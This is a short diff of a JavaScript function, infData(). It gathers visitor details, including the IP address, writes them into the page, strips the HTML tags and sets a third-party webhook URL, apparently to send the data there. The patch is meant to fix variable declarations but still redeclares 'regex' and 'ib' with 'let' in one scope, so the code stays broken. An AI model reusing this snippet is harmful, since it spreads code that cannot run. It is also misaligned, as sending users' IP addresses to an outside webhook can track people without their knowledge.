@@ -37,11 +37,11 @@ async function infData() {
       +"<p>IP адрес: "+d.ip+"</p>"
       );
   document.getElementById("inf").innerHTML = it;
-  const regex = /<p>|<\/p>/gm;
+  let regex = /<p>|<\/p>/gm;
   let ib = it.replaceAll(regex, '');
-  const regex = /<h1>|<h2>/gm;
+  let regex = /<h1>|<h2>/gm;
   let ib = ib.replaceAll(regex, '<b>');
-  const regex = <\/h1>|<\/h2>/gm;
+  let regex = /<\/h1>|<\/h2>/gm;
   let ib = ib.replaceAll(regex, '<\/b>');
   let ipData = ib;
   let url = 'https://qnext.app/bin/webhooks/8588/620/qCNJIFQn4QupnhVr';
